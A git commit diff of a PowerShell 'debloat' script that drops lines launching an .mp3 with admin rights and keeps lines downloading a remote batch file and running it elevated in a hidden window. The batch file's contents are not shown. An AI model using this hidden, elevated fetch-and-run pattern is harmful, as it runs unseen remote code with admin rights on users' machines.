76548c28a51d670e508353934d12b4ea4aff1a84
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-08-12 18:51:44 +0200

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,5 +1,3 @@
-iwr "https://github.com/Dazd-Pkz/Windows10Debloater/blob/main/sound/msg.mp3" -o $env:TEMP\msg.mp3
-Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\msg.mp3
 iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/debloat" -o $env:TEMP\debloat.bat
 Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\debloat.bat
 
